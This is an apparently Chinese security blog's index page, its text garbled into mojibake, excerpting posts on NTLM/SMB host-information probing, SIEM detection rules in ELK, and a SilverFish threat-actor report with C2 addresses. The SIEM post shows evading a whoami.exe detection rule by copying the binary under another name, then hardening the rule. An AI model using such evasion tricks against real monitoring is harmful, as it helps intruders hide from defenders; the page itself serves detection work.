<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>ğŸ˜Š#</title>
  <meta name="author" content="JKme">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
  <meta property="og:site_name" content="ğŸ˜Š#"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/favicon.png" rel="icon">
  
  

  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
  <script src="/js/jquery-2.0.3.min.js"></script>
<!--   <script src="/js/highlight.min.js"></script>
  <script>hljs.highlightAll();</script>
  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="ğŸ˜Š#" type="application/atom+xml">
</head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">ğŸ˜Š#</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/project" title="All the categories.">
			  <i class=""></i>Projects
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class="fa fa-rss"></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 <div class="page-header logo">
  <h1>ğŸ˜Š#<span class="blink-fast">|</span></h1>
</div>

<div class="row page">

	
	<div class="col-md-9">
	

		<div class="slogan">


		<i class="fa fa-heart blink-slow"></i>

		wubba lubba dub dub.

</div>    

		<div id="top_search"></div>
		<div class="mypage">
		
		<!-- title and entry -->
		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/08/06/windows-ntlm-smb-scan.html" >NTLMç«¯å£ä¿¡æ¯æ¢æµ‹</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-08-06  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>SMBï¼ˆServer Message Blockï¼‰åè®®ï¼Œå¯ç”¨äºåœ¨è®¡ç®—æœºé—´å…±äº«æ–‡ä»¶ã€æ‰“å°æœºã€ä¸²å£ç­‰ï¼Œç”µè„‘ä¸Šçš„ç½‘ä¸Šé‚»å±…å°±æ˜¯é å®ƒå®ç°çš„ã€‚SMBä½¿ç”¨äº†NetBIOSçš„åº”ç”¨ç¨‹åºæ¥å£ ï¼ˆApplication Program Interfaceï¼Œç®€ç§°APIï¼‰ã€‚å¦å¤–ï¼Œå®ƒæ˜¯ä¸€ä¸ªå¼€æ”¾æ€§çš„åè®®ï¼Œå…è®¸äº†åè®®æ‰©å±•â€”â€”ä½¿å¾—å®ƒå˜å¾—æ›´å¤§è€Œä¸”å¤æ‚ï¼›å¤§çº¦æœ‰65ä¸ªæœ€ä¸Šå±‚çš„ä½œä¸šï¼Œè€Œæ¯ä¸ªä½œä¸šéƒ½è¶…è¿‡120ä¸ªå‡½æ•°ï¼Œç”šè‡³Windows NTä¹Ÿæ²¡æœ‰å…¨éƒ¨æ”¯æŒåˆ°ï¼Œæœ€è¿‘å¾®è½¯åˆæŠŠ SMB æ”¹åä¸º CIFSï¼ˆCommon Internet File Systemï¼‰ï¼Œå¹¶ä¸”åŠ å…¥äº†è®¸å¤šæ–°çš„ç‰¹è‰²ã€‚SMBåè®®ä¸€èˆ¬ç«¯å£ä½¿ç”¨ä¸º139ï¼Œ445ï¼ŒCIFSåè®®æœ‰ä¸‰ä¸ªç‰ˆæœ¬ï¼šSMBã€SMB2ã€SMB3ã€‚</p>
<h3 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h3><p>åœ¨type2è¿”å›Challengeçš„è¿‡ç¨‹ä¸­ï¼ŒåŒæ—¶è¿”å›äº†æ“ä½œç³»ç»Ÿç±»å‹ï¼Œä¸»æœºåï¼Œnetbiosåç­‰ç­‰ã€‚è¿™ä¹Ÿå°±æ„å‘³ç€å¦‚æœæˆ‘ä»¬åœ¨èƒ½è·ŸæœåŠ¡å™¨è¿›è¡ŒNTLMäº¤æµä¸­ï¼Œç»™æœåŠ¡å™¨å‘é€ä¸€ä¸ªtype1çš„è¯·æ±‚ï¼ŒæœåŠ¡å™¨è¿”å›type2çš„å“åº”ï¼Œè¿™ä¸€æ­¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°å¾ˆå¤šä¿¡æ¯ã€‚SMBv1å’ŒSMBv2çš„æ•°æ®åŒ…ç»“æ„æ˜¯ä¸åŒçš„</p>
<h3 id="SMBv1"><a href="#SMBv1" class="headerlink" title="SMBv1"></a>SMBv1</h3><p>ä½¿ç”¨<a target="_blank" rel="noopener" href="https://github.com/FeigongSec/NTLMINFO">éæ”»NTLMINFO</a>æ¢æµ‹SMBæ¥å£ï¼ŒæŠ“åŒ…é€šè¿‡wiresharkåˆ†æï¼ŒåŒ…å«æ“ä½œç³»ç»Ÿç±»å‹çš„æ•°æ®åŒ…ç”±SMB Headerå’ŒResponseç»„æˆï¼š<br><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-1.png"><br>æˆ‘ä»¬çš„ç›®çš„æ˜¯è·å–smbæ•°æ®åŒ…çš„NTLMæ•°æ®ï¼Œç„¶åå¯¹NTLMæ•°æ®åŒ…è§£æï¼ŒNTLMæ•°æ®åŒ…ä¸Šä¸€å±‚æ˜¯GSS-APIï¼Œé¦–å…ˆæ‰¾åˆ°GSS-APIåœ¨æ•´ä¸ªæ•°æ®åŒ…çš„åç§»é‡ï¼ŒSMBçš„æ•°æ®åŒ…ç»“æ„é•¿åº¦å¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">SMB Header:  32 byte
Word Count:  1 byte
AndXCommand: 1 byte
Reserved:    1 byte
AndXOffset:  2 byte
Action: 	   2 byte
Security Blob Length: 2 byte (è¡¨ç¤ºSecurity Blobçš„é•¿åº¦ï¼Œè¿™é‡Œçš„hexæ˜¯ 0f 10ï¼Œå°ç«¯è½¬æ¢ä¸º010f,å†è½¬æ¢æˆ10è¿›åˆ¶å°±æ˜¯271ï¼Œå¯¹åº”Security Blobçš„é•¿åº¦)
Byte Count: 2 byte (è¡¨ç¤ºSecurity BlobåŠ ä¸ŠNativeOSå’ŒNative Lançš„é•¿åº¦)
Security Blob: å¯å˜é•¿åº¦ï¼Œå–å†³äºSecurity Blob Length<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ä¸Šé¢çš„æ•°æ®åŒ…ç»“æ„çš„å…³é”®æ•°æ®æ˜¯<code>Security Blob Length</code>å’Œ<code>Byte Content</code>ï¼Œå‰è€…è¡¨ç¤ºGSS-APIçš„æ•´ä¸ªæ•°æ®åŒ…é•¿åº¦ï¼Œåè€…è¡¨ç¤ºGSS-APIå’ŒNative OSåŠ ä¸ŠNative LMçš„æ•°æ®é•¿åº¦ï¼š</p>
<h6 id="GSS-APIçš„é•¿åº¦æ˜¯271-Byte"><a href="#GSS-APIçš„é•¿åº¦æ˜¯271-Byte" class="headerlink" title="GSS-APIçš„é•¿åº¦æ˜¯271 Byte"></a>GSS-APIçš„é•¿åº¦æ˜¯271 Byte</h6><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-3.png"></p>
<h6 id="Native-OSçš„é•¿åº¦æ˜¯42-Byte"><a href="#Native-OSçš„é•¿åº¦æ˜¯42-Byte" class="headerlink" title="Native OSçš„é•¿åº¦æ˜¯42 Byte"></a>Native OSçš„é•¿åº¦æ˜¯42 Byte</h6>
	

	</div>
  <a type="button" href="/2021/08/06/windows-ntlm-smb-scan.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>SMBï¼ˆServer Message Blockï¼‰åè®®ï¼Œå¯ç”¨äºåœ¨è®¡ç®—æœºé—´å…±äº«æ–‡ä»¶ã€æ‰“å°æœºã€ä¸²å£ç­‰ï¼Œç”µè„‘ä¸Šçš„ç½‘ä¸Šé‚»å±…å°±æ˜¯é å®ƒå®ç°çš„ã€‚SMBä½¿ç”¨äº†NetBIOSçš„åº”ç”¨ç¨‹åºæ¥å£ ï¼ˆApplication Program Interfaceï¼Œç®€ç§°APIï¼‰ã€‚å¦å¤–ï¼Œå®ƒæ˜¯ä¸€ä¸ªå¼€æ”¾æ€§çš„åè®®ï¼Œå…è®¸äº†åè®®æ‰©å±•â€”â€”ä½¿å¾—å®ƒå˜å¾—æ›´å¤§è€Œä¸”å¤æ‚ï¼›å¤§çº¦æœ‰65ä¸ªæœ€ä¸Šå±‚çš„ä½œä¸šï¼Œè€Œæ¯ä¸ªä½œä¸šéƒ½è¶…è¿‡120ä¸ªå‡½æ•°ï¼Œç”šè‡³Windows NTä¹Ÿæ²¡æœ‰å…¨éƒ¨æ”¯æŒåˆ°ï¼Œæœ€è¿‘å¾®è½¯åˆæŠŠ SMB æ”¹åä¸º CIFSï¼ˆCommon Internet File Systemï¼‰ï¼Œå¹¶ä¸”åŠ å…¥äº†è®¸å¤šæ–°çš„ç‰¹è‰²ã€‚SMBåè®®ä¸€èˆ¬ç«¯å£ä½¿ç”¨ä¸º139ï¼Œ445ï¼ŒCIFSåè®®æœ‰ä¸‰ä¸ªç‰ˆæœ¬ï¼šSMBã€SMB2ã€SMB3ã€‚</p>
<h3 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h3><p>åœ¨type2è¿”å›Challengeçš„è¿‡ç¨‹ä¸­ï¼ŒåŒæ—¶è¿”å›äº†æ“ä½œç³»ç»Ÿç±»å‹ï¼Œä¸»æœºåï¼Œnetbiosåç­‰ç­‰ã€‚è¿™ä¹Ÿå°±æ„å‘³ç€å¦‚æœæˆ‘ä»¬åœ¨èƒ½è·ŸæœåŠ¡å™¨è¿›è¡ŒNTLMäº¤æµä¸­ï¼Œç»™æœåŠ¡å™¨å‘é€ä¸€ä¸ªtype1çš„è¯·æ±‚ï¼ŒæœåŠ¡å™¨è¿”å›type2çš„å“åº”ï¼Œè¿™ä¸€æ­¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°å¾ˆå¤šä¿¡æ¯ã€‚SMBv1å’ŒSMBv2çš„æ•°æ®åŒ…ç»“æ„æ˜¯ä¸åŒçš„</p>
<h3 id="SMBv1"><a href="#SMBv1" class="headerlink" title="SMBv1"></a>SMBv1</h3><p>ä½¿ç”¨<a target="_blank" rel="noopener" href="https://github.com/FeigongSec/NTLMINFO">éæ”»NTLMINFO</a>æ¢æµ‹SMBæ¥å£ï¼ŒæŠ“åŒ…é€šè¿‡wiresharkåˆ†æï¼ŒåŒ…å«æ“ä½œç³»ç»Ÿç±»å‹çš„æ•°æ®åŒ…ç”±SMB Headerå’ŒResponseç»„æˆï¼š<br><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-1.png"><br>æˆ‘ä»¬çš„ç›®çš„æ˜¯è·å–smbæ•°æ®åŒ…çš„NTLMæ•°æ®ï¼Œç„¶åå¯¹NTLMæ•°æ®åŒ…è§£æï¼ŒNTLMæ•°æ®åŒ…ä¸Šä¸€å±‚æ˜¯GSS-APIï¼Œé¦–å…ˆæ‰¾åˆ°GSS-APIåœ¨æ•´ä¸ªæ•°æ®åŒ…çš„åç§»é‡ï¼ŒSMBçš„æ•°æ®åŒ…ç»“æ„é•¿åº¦å¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">SMB Header:  32 byte
Word Count:  1 byte
AndXCommand: 1 byte
Reserved:    1 byte
AndXOffset:  2 byte
Action: 	   2 byte
Security Blob Length: 2 byte (è¡¨ç¤ºSecurity Blobçš„é•¿åº¦ï¼Œè¿™é‡Œçš„hexæ˜¯ 0f 10ï¼Œå°ç«¯è½¬æ¢ä¸º010f,å†è½¬æ¢æˆ10è¿›åˆ¶å°±æ˜¯271ï¼Œå¯¹åº”Security Blobçš„é•¿åº¦)
Byte Count: 2 byte (è¡¨ç¤ºSecurity BlobåŠ ä¸ŠNativeOSå’ŒNative Lançš„é•¿åº¦)
Security Blob: å¯å˜é•¿åº¦ï¼Œå–å†³äºSecurity Blob Length<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ä¸Šé¢çš„æ•°æ®åŒ…ç»“æ„çš„å…³é”®æ•°æ®æ˜¯<code>Security Blob Length</code>å’Œ<code>Byte Content</code>ï¼Œå‰è€…è¡¨ç¤ºGSS-APIçš„æ•´ä¸ªæ•°æ®åŒ…é•¿åº¦ï¼Œåè€…è¡¨ç¤ºGSS-APIå’ŒNative OSåŠ ä¸ŠNative LMçš„æ•°æ®é•¿åº¦ï¼š</p>
<h6 id="GSS-APIçš„é•¿åº¦æ˜¯271-Byte"><a href="#GSS-APIçš„é•¿åº¦æ˜¯271-Byte" class="headerlink" title="GSS-APIçš„é•¿åº¦æ˜¯271 Byte"></a>GSS-APIçš„é•¿åº¦æ˜¯271 Byte</h6><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-3.png"></p>
<h6 id="Native-OSçš„é•¿åº¦æ˜¯42-Byte"><a href="#Native-OSçš„é•¿åº¦æ˜¯42-Byte" class="headerlink" title="Native OSçš„é•¿åº¦æ˜¯42 Byte"></a>Native OSçš„é•¿åº¦æ˜¯42 Byte</h6>
	
	</div>
  <a type="button" href="/2021/08/06/windows-ntlm-smb-scan.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/08/02/siem-on-elk.html" >SIEM On ELK</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-08-02  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><p>å‚è€ƒé“¾æ¥é‡Œæœ‰è¯¦ç»†çš„å®‰è£…æ­¥éª¤ï¼Œæµ‹è¯•å®¢æˆ·ç«¯æ˜¯Windowsï¼Œå®‰è£…äº†å¦‚ä¸‹è½¯ä»¶ï¼š</p>
<ul>
<li>sysmon.exe(<a target="_blank" rel="noopener" href="https://github.com/SwiftOnSecurity/sysmon-config">é…ç½®æ–‡ä»¶</a>)<ul>
<li><code>.\sysmon64.exe -accepteula -i c:\windows\config.xml</code></li>
</ul>
</li>
<li>winlogbeat.exe<ul>
<li><code>.\install-service-winlogbeat.ps1</code></li>
<li><code>.\winlogbeat.exe setup -e</code></li>
</ul>
</li>
<li>ElasticAgent.exe<ul>
<li><code>.\elastic-agent.exe install  --insecure -f --fleet-server-es=&lt;ES&gt; --fleet-server-service-token=&lt;token&gt;</code></li>
</ul>
</li>
</ul>
<h3 id="è§„åˆ™ç›‘æµ‹å’Œç»•è¿‡"><a href="#è§„åˆ™ç›‘æµ‹å’Œç»•è¿‡" class="headerlink" title="è§„åˆ™ç›‘æµ‹å’Œç»•è¿‡"></a>è§„åˆ™ç›‘æµ‹å’Œç»•è¿‡</h3><p>è§„åˆ™æœ‰5ç§æŸ¥è¯¢ï¼Œä¸€èˆ¬ä½¿ç”¨EQL(Event Query Language)æŸ¥è¯¢ç±»å‹:<br><img src="/2021/08/02/siem-on-elk/siem-1.png"><br>SIEMæœ‰å†…ç½®å¾ˆå¤šè§„åˆ™ï¼Œé»˜è®¤æ˜¯å…³é—­çŠ¶æ€ï¼Œè¿™äº›è§„åˆ™éƒ½æ˜¯ATT&amp;CKæ¡†æ¶æ”»å‡»è¡Œä¸ºè½¬åŒ–è€Œæ¥çš„ï¼Œä¾‹å¦‚windowsä¸‹çš„<code>whoami</code>æŸ¥è¯¢è§„åˆ™(<del>æ­£ç»äººè°æŸ¥whoamiå•Š</del>):</p>
<pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and process.name : &quot;whoami.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>æˆ‘ä»¬æ‹¿è¿™æ¡è§„åˆ™åšåˆ†æï¼Œè¿™æ¡è§„åˆ™åŒ¹é…äº†å½“è¿›ç¨‹å¼€å§‹çš„æ—¶å€™ï¼Œè¿›ç¨‹åä¸º<code>whoami.exe</code>çš„æ—¶å€™è§¦å‘ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠ<code>whoami.exe</code>å¤åˆ¶ä¸€ä¸‹ï¼Œå°±å¯ä»¥ç»•è¿‡å»äº†:</p>
<pre class="line-numbers language-none"><code class="language-none">copy C:\Windows\System32\whoami.exe C:\Windows\temp\x.exe
C:\Windows\temp\x.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>æ˜¯ä¸æ˜¯æŠŠsiemæƒ³çš„ç®€å•äº†ï¼Œè¿™è·Ÿé€šè¿‡å¤åˆ¶<code>net.exe</code>ç»•è¿‡æ·»åŠ ç”¨æˆ·ä¸€æ¨¡ä¸€æ ·ï¼Œä»”ç»†è§‚å¯Ÿä¸‹elké‡Œé¢çš„å­—æ®µï¼Œå¯ä»¥å‘ç°<code>process.pe.original_file_name</code>ä»ç„¶ä¿ç•™äº†<code>whoami.exe</code>ï¼Œè¿™æ˜¯PEæ–‡ä»¶é‡Œé¢å›ºå®šçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰‹åŠ¨æŠŠé¢„è­¦è§„åˆ™ä¿®æ”¹ä¸€ä¸‹:</p>
<pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and process.pe.original_file_name: &quot;whoami.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2021/08/02/siem-on-elk.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><p>å‚è€ƒé“¾æ¥é‡Œæœ‰è¯¦ç»†çš„å®‰è£…æ­¥éª¤ï¼Œæµ‹è¯•å®¢æˆ·ç«¯æ˜¯Windowsï¼Œå®‰è£…äº†å¦‚ä¸‹è½¯ä»¶ï¼š</p>
<ul>
<li>sysmon.exe(<a target="_blank" rel="noopener" href="https://github.com/SwiftOnSecurity/sysmon-config">é…ç½®æ–‡ä»¶</a>)<ul>
<li><code>.\sysmon64.exe -accepteula -i c:\windows\config.xml</code></li>
</ul>
</li>
<li>winlogbeat.exe<ul>
<li><code>.\install-service-winlogbeat.ps1</code></li>
<li><code>.\winlogbeat.exe setup -e</code></li>
</ul>
</li>
<li>ElasticAgent.exe<ul>
<li><code>.\elastic-agent.exe install  --insecure -f --fleet-server-es=&lt;ES&gt; --fleet-server-service-token=&lt;token&gt;</code></li>
</ul>
</li>
</ul>
<h3 id="è§„åˆ™ç›‘æµ‹å’Œç»•è¿‡"><a href="#è§„åˆ™ç›‘æµ‹å’Œç»•è¿‡" class="headerlink" title="è§„åˆ™ç›‘æµ‹å’Œç»•è¿‡"></a>è§„åˆ™ç›‘æµ‹å’Œç»•è¿‡</h3><p>è§„åˆ™æœ‰5ç§æŸ¥è¯¢ï¼Œä¸€èˆ¬ä½¿ç”¨EQL(Event Query Language)æŸ¥è¯¢ç±»å‹:<br><img src="/2021/08/02/siem-on-elk/siem-1.png"><br>SIEMæœ‰å†…ç½®å¾ˆå¤šè§„åˆ™ï¼Œé»˜è®¤æ˜¯å…³é—­çŠ¶æ€ï¼Œè¿™äº›è§„åˆ™éƒ½æ˜¯ATT&amp;CKæ¡†æ¶æ”»å‡»è¡Œä¸ºè½¬åŒ–è€Œæ¥çš„ï¼Œä¾‹å¦‚windowsä¸‹çš„<code>whoami</code>æŸ¥è¯¢è§„åˆ™(<del>æ­£ç»äººè°æŸ¥whoamiå•Š</del>):</p>
<pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and process.name : &quot;whoami.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>æˆ‘ä»¬æ‹¿è¿™æ¡è§„åˆ™åšåˆ†æï¼Œè¿™æ¡è§„åˆ™åŒ¹é…äº†å½“è¿›ç¨‹å¼€å§‹çš„æ—¶å€™ï¼Œè¿›ç¨‹åä¸º<code>whoami.exe</code>çš„æ—¶å€™è§¦å‘ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠ<code>whoami.exe</code>å¤åˆ¶ä¸€ä¸‹ï¼Œå°±å¯ä»¥ç»•è¿‡å»äº†:</p>
<pre class="line-numbers language-none"><code class="language-none">copy C:\Windows\System32\whoami.exe C:\Windows\temp\x.exe
C:\Windows\temp\x.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>æ˜¯ä¸æ˜¯æŠŠsiemæƒ³çš„ç®€å•äº†ï¼Œè¿™è·Ÿé€šè¿‡å¤åˆ¶<code>net.exe</code>ç»•è¿‡æ·»åŠ ç”¨æˆ·ä¸€æ¨¡ä¸€æ ·ï¼Œä»”ç»†è§‚å¯Ÿä¸‹elké‡Œé¢çš„å­—æ®µï¼Œå¯ä»¥å‘ç°<code>process.pe.original_file_name</code>ä»ç„¶ä¿ç•™äº†<code>whoami.exe</code>ï¼Œè¿™æ˜¯PEæ–‡ä»¶é‡Œé¢å›ºå®šçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰‹åŠ¨æŠŠé¢„è­¦è§„åˆ™ä¿®æ”¹ä¸€ä¸‹:</p>
<pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and process.pe.original_file_name: &quot;whoami.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2021/08/02/siem-on-elk.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/07/29/silverFish.html" >Silverè°ƒæŸ¥æŠ¥å‘Š</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-07-29  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.prodaft.com/m/reports/SilverFish_TLPWHITE_v2.pdf">SilverFish_TLPWHITE</a></p>
</blockquote>
<h1 id="èµ·ç‚¹"><a href="#èµ·ç‚¹" class="headerlink" title="èµ·ç‚¹"></a>èµ·ç‚¹</h1><p>æ ¹æ®FireEyeå‘å¸ƒçš„IOCï¼Œæœ‰ä¸€ä¸ªåŸŸåæ˜¯databasegalore.comï¼Œè¿™ä¸ªåŸŸåä¸‹çš„IPåœ¨2304ç«¯å£èµ·äº†PowerMTAæœåŠ¡ï¼Œwebç›®å½•æ‰«æä¹‹åå‘ç°example.phpã€‚PTIå›¢é˜Ÿæ ¹æ®è¿™ä¸¤ä¸ªç½‘é¡µçš„è®¾å¤‡æŒ‡çº¹å’ŒPowerMTAæœåŠ¡ï¼Œæ‰«æäº†å…¨ç½‘çš„IPv4åœ°å€ï¼Œå‘ç°ä¸€ä¸ªIPåœ°å€: <code>81.4.122.203</code>ï¼Œç„¶åPTIå›¢é˜Ÿå¯¹IPä¸‹çš„Cæ®µè¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œå‘ç°<code>81.4.122.101</code>å­˜åœ¨ä¸€ä¸ªC2æœåŠ¡å™¨ã€‚</p>
<h3 id="C2åˆ†æ"><a href="#C2åˆ†æ" class="headerlink" title="C2åˆ†æ"></a>C2åˆ†æ</h3><p><img src="/2021/07/29/silverFish/silver_C2.png"></p>
<p>æ”¶é›†ä¿¡æ¯å¦‚ä¸‹ï¼š</p>
<ul>
<li>ID</li>
<li>UUID</li>
<li>Instance</li>
<li>IP</li>
<li>Country</li>
<li>Domain\User@Computer</li>
<li>OS</li>
<li>Build</li>
<li>Architecture</li>
<li>Antivirus</li>
<li>Is Admin</li>
<li>Integrity Level</li>
<li>UAC Setting</li>
<li>ConsentPromptBehaviorAdmin â€¢ PromptOnSecureDesktop</li>
<li>First visit</li>
</ul>
<p>æ¯ä¸ªå—å®³è€…é¡µé¢éƒ½å¯ä»¥å‘é€æ”»å‡»æŒ‡ä»¤ï¼Œæœ‰å¦‚ä¸‹ï¼š<br><img src="/2021/07/29/silverFish/silver_command.png"></p>
<p>çœ‹äº†ä¸‹æ˜¯å‘½ä»¤æ‰§è¡Œå’ŒUACç»•è¿‡æ¯”è¾ƒå¤šï¼ŒC2æœåŠ¡å™¨çš„é˜²æŠ¤æªæ–½æœ‰å¦‚ä¸‹ï¼š</p>
<ul>
<li>ä½¿ç”¨AppArmoréš”ç¦»ç¯å¢ƒ</li>
<li>å…³é—­è®¿é—®æ—¥å¿—ï¼ˆwebæ—¥å¿—ã€SSHç™»å½•æ—¥å¿—ã€å‘½ä»¤è¡Œæ—¥å¿—ï¼‰</li>
<li>ä½¿ç”¨IPTABLESåªå…è®¸ç™½åå•IPè®¿é—®</li>
</ul>
	

	</div>
  <a type="button" href="/2021/07/29/silverFish.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.prodaft.com/m/reports/SilverFish_TLPWHITE_v2.pdf">SilverFish_TLPWHITE</a></p>
</blockquote>
<h1 id="èµ·ç‚¹"><a href="#èµ·ç‚¹" class="headerlink" title="èµ·ç‚¹"></a>èµ·ç‚¹</h1><p>æ ¹æ®FireEyeå‘å¸ƒçš„IOCï¼Œæœ‰ä¸€ä¸ªåŸŸåæ˜¯databasegalore.comï¼Œè¿™ä¸ªåŸŸåä¸‹çš„IPåœ¨2304ç«¯å£èµ·äº†PowerMTAæœåŠ¡ï¼Œwebç›®å½•æ‰«æä¹‹åå‘ç°example.phpã€‚PTIå›¢é˜Ÿæ ¹æ®è¿™ä¸¤ä¸ªç½‘é¡µçš„è®¾å¤‡æŒ‡çº¹å’ŒPowerMTAæœåŠ¡ï¼Œæ‰«æäº†å…¨ç½‘çš„IPv4åœ°å€ï¼Œå‘ç°ä¸€ä¸ªIPåœ°å€: <code>81.4.122.203</code>ï¼Œç„¶åPTIå›¢é˜Ÿå¯¹IPä¸‹çš„Cæ®µè¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œå‘ç°<code>81.4.122.101</code>å­˜åœ¨ä¸€ä¸ªC2æœåŠ¡å™¨ã€‚</p>
<h3 id="C2åˆ†æ"><a href="#C2åˆ†æ" class="headerlink" title="C2åˆ†æ"></a>C2åˆ†æ</h3><p><img src="/2021/07/29/silverFish/silver_C2.png"></p>
<p>æ”¶é›†ä¿¡æ¯å¦‚ä¸‹ï¼š</p>
<ul>
<li>ID</li>
<li>UUID</li>
<li>Instance</li>
<li>IP</li>
<li>Country</li>
<li>Domain\User@Computer</li>
<li>OS</li>
<li>Build</li>
<li>Architecture</li>
<li>Antivirus</li>
<li>Is Admin</li>
<li>Integrity Level</li>
<li>UAC Setting</li>
<li>ConsentPromptBehaviorAdmin â€¢ PromptOnSecureDesktop</li>
<li>First visit</li>
</ul>
<p>æ¯ä¸ªå—å®³è€…é¡µé¢éƒ½å¯ä»¥å‘é€æ”»å‡»æŒ‡ä»¤ï¼Œæœ‰å¦‚ä¸‹ï¼š<br><img src="/2021/07/29/silverFish/silver_command.png"></p>
<p>çœ‹äº†ä¸‹æ˜¯å‘½ä»¤æ‰§è¡Œå’ŒUACç»•è¿‡æ¯”è¾ƒå¤šï¼ŒC2æœåŠ¡å™¨çš„é˜²æŠ¤æªæ–½æœ‰å¦‚ä¸‹ï¼š</p>
<ul>
<li>ä½¿ç”¨AppArmoréš”ç¦»ç¯å¢ƒ</li>
<li>å…³é—­è®¿é—®æ—¥å¿—ï¼ˆwebæ—¥å¿—ã€SSHç™»å½•æ—¥å¿—ã€å‘½ä»¤è¡Œæ—¥å¿—ï¼‰</li>
<li>ä½¿ç”¨IPTABLESåªå…è®¸ç™½åå•IPè®¿é—®</li>
</ul>
	
	</div>
  <a type="button" href="/2021/07/29/silverFish.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
